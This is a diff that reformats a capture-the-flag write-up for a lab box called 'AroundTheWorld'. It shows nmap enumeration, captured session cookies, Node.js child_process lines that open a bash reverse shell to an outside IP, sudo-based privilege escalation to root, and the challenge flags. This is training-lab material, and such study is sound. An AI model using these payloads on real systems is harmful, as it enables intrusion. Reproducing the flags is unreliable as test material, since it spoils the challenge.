@@ -1,5 +1,8 @@
-AroundTheWorld
+# AroundTheWorld
 
+## Enumeration
+
+```bash
 └─$ nmap -sV -A -p- -sC -T4 10.10.3.188                          
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 11:25 BST
 Nmap scan report for 10.10.3.188
@@ -18,8 +21,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 116.37 seconds
+```
+## Exploitation
 
+### Sessions cookie with Burp Suite for the exploit
 
+```bash
 marius = connect.sid=s%3AYEh3XOXfeJ4VmlYmq7JRYp6waS-y555e.Ts929QOfsFRtzp%2FT3bT9nOizyk1LRI5oYZTlTe8vRZs
 
 clement = connect.sid=s%3A40X2GhAa_PU5sozzpjJJkN4O2xcwURpc.FW0yOOX%2BMZeltzwEL8HXypG167cJU1A9FMVop3uE6TM
@@ -30,10 +37,22 @@ yes 1 | head -n 10000 > gold.txt
 
 require("child_process").exec("bash -c 'exec bash -i &>/dev/tcp/10.8.37.214/4447 <&1'")
 require("child_process").exec("bash -c 'exec bash -i &>/dev/tcp/10.8.37.214/4444 <&1'")
+```
+### Got a reverse shell as simple user
+
+#### Spawn an upgrade shell
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-cat user.txt = EPI{we_R_HuM4N2_4f7eR_4ll}
+## User FLAG
 
+```bashcat user.txt``` = EPI{we_R_HuM4N2_4f7eR_4ll}
+
+## Privilege Escalation
+
+### Got a shell as tb3 who has more rights
+```bash
 sudo -u tb3 /bin/bash
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -63,4 +82,8 @@ ssuuddoo  cchhoowwnn  ttbb33::ttbb33  //rroooott
 
 ccaatt  //rroooott//rroooott..ttxxtt  >>  //hhoommee//ttbb33//rroooott..ttxxtt
 
-cd .. ; cat root.txt : EPI{172_4m421n9_WH@_JOoll_ph1ND_ph4c3_7o_Ph4c3}
+cat root.txt
+```
+## Root FLAG
+
+EPI{172_4m421n9_WH@_JOoll_ph1ND_ph4c3_7o_Ph4c3}
